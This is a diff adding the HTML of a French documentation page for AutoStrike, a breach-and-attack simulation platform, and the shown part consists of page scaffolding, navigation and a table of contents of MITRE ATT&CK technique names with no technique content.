@@ -1,0 +1,3982 @@
+
+<!doctype html>
+<html lang="fr" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Plateforme BAS (Breach and Attack Simulation) basée sur MITRE ATT&CK">
+      
+      
+      
+        <link rel="canonical" href="https://autostrike-eip.github.io/AutoStrike_POC/mitre/techniques/">
+      
+      
+        <link rel="prev" href="../">
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
+    
+    
+      
+        <title>Techniques - AutoStrike Documentation</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="orange">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#mitre-attck-techniques" class="md-skip">
+          Aller au contenu
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="En-tête">
+    <a href="../.." title="AutoStrike Documentation" class="md-header__button md-logo" aria-label="AutoStrike Documentation" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            AutoStrike Documentation
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Techniques
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="orange"  aria-label="Passer en mode clair"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Passer en mode clair" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="red" data-md-color-accent="orange"  aria-label="Passer en mode sombre"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Passer en mode sombre" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Rechercher" placeholder="Rechercher" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Recherche">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Effacer" aria-label="Effacer" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initialisation de la recherche
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/AutoStrike-EIP/AutoStrike_POC" title="Aller au dépôt" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    AutoStrike_POC
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Onglets" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Accueil
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../guide/" class="md-tabs__link">
+          
+  
+  
+  Guide
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../architecture/" class="md-tabs__link">
+          
+  
+  
+  Architecture
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../api/" class="md-tabs__link">
+          
+  
+  
+  API
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../" class="md-tabs__link">
+          
+  
+  
+  MITRE ATT&CK
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="AutoStrike Documentation" class="md-nav__button md-logo" aria-label="AutoStrike Documentation" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    AutoStrike Documentation
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/AutoStrike-EIP/AutoStrike_POC" title="Aller au dépôt" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    AutoStrike_POC
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Accueil
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Guide
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Guide
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../guide/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Guide
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../guide/installation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Installation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../guide/quickstart/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Démarrage rapide
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../guide/deployment/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Déploiement
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Architecture
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Architecture
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../architecture/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Architecture
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../architecture/backend/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Backend (Go)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../architecture/agent/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Agent (Rust)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../architecture/dashboard/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Dashboard (React)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    API
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    API
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../api/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    API
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../api/reference/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Référence
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MITRE ATT&CK
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    MITRE ATT&CK
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MITRE ATT&amp;CK
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Techniques
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Techniques
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table des matières">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table des matières
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Overview
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reconnaissance-2-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Reconnaissance (2 techniques)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Reconnaissance (2 techniques)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#t1592004-gather-victim-host-information-client-configurations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1592.004 - Gather Victim Host Information: Client Configurations
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1595002-active-scanning-vulnerability-scanning" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1595.002 - Active Scanning: Vulnerability Scanning
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#initial-access-3-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Initial Access (3 techniques)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Initial Access (3 techniques)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#t1078-valid-accounts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1078 - Valid Accounts
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1133-external-remote-services" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1133 - External Remote Services
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1190-exploit-public-facing-application" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1190 - Exploit Public-Facing Application
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#execution-5-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Execution (5 techniques)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Execution (5 techniques)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#t1059001-powershell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1059.001 - PowerShell
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1059003-windows-command-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1059.003 - Windows Command Shell
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1059004-unix-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1059.004 - Unix Shell
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1047-windows-management-instrumentation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1047 - Windows Management Instrumentation
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1059006-python" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1059.006 - Python
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#persistence-4-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Persistence (4 techniques)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Persistence (4 techniques)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#t1053005-scheduled-task" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1053.005 - Scheduled Task
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1547001-registry-run-keys-startup-folder" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1547.001 - Registry Run Keys / Startup Folder
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1053003-cron" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1053.003 - Cron
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#t1543002-systemd-service" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1543.002 - Systemd Service
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation-4-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation (4 techniques)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation (4 techniques)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#t1548001-setuid-and-setgid" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        T1548.001 - Setuid and Setgid
+      
